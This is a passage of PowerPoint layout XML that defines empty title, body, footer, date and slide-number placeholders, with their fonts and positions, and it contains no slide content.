          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{DAB0FE80-7F56-48F8-89DC-48B2D19D1FE1}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="401566198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a:xfrm>
            <a:off x="935184" y="717177"/>
            <a:ext cx="10321636" cy="692497"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4412" b="0" i="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr>
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Holder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{49233F02-E08D-4D3B-94C3-78986757D58A}" type="datetimeFigureOut">
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
              </a:rPr>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Holder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{D4900902-AA24-4DCE-B47B-DB309BA1BFC0}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="392953203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4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr>
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Holder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{4DAA92B5-25E1-49A3-B610-1795CB4B8A03}" type="datetimeFigureOut">
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
              </a:rPr>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Holder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{CC85A84F-5756-48F4-BC9A-BA7265FCFD00}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="121828038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276999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Holder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1828800" y="3840480"/>
            <a:ext cx="8534400" cy="423193"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr>
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Holder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{3571B8D1-1194-4C75-8E0F-97E3F6CC0214}" type="datetimeFigureOut">
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
              </a:rPr>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Holder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{4E609868-9CBD-4FE9-8E1A-A80C2B6F5C54}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="310579120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935184" y="717177"/>
            <a:ext cx="10321636" cy="692497"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4412" b="0" i="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Holder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1296940" y="2291605"/>
            <a:ext cx="9598121" cy="378709"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="2382" b="0" i="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr>
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Holder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{FF9E85CA-9BEC-4763-8EC7-AA764B7A2E19}" type="datetimeFigureOut">
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
              </a:rPr>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Holder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{CE586DEB-CA92-4A4B-863B-E5DC36A66221}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="66373297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935184" y="717177"/>
            <a:ext cx="10321636" cy="692497"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4412" b="0" i="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Holder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="half" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1577340"/>
            <a:ext cx="5303520" cy="423193"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="half" idx="3"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6278880" y="1577340"/>
            <a:ext cx="5303520" cy="423193"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr>
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Holder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{3B7A0884-1386-44C3-B885-F404CDA667B2}" type="datetimeFigureOut">
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
              </a:rPr>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Holder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{DAB0FE80-7F56-48F8-89DC-48B2D19D1FE1}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="296011179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a:xfrm>
            <a:off x="935184" y="717177"/>
            <a:ext cx="10321636" cy="692497"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4412" b="0" i="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr>
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Holder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{49233F02-E08D-4D3B-94C3-78986757D58A}" type="datetimeFigureOut">
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
              </a:rPr>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Holder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{D4900902-AA24-4DCE-B47B-DB309BA1BFC0}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="47964919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4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr>
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Holder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{4DAA92B5-25E1-49A3-B610-1795CB4B8A03}" type="datetimeFigureOut">
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
              </a:rPr>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Holder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{CC85A84F-5756-48F4-BC9A-BA7265FCFD00}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="211135545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4" name="bk object 16"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="344440" y="410416"/>
            <a:ext cx="11193318" cy="3251106"/>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defTabSz="714375">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
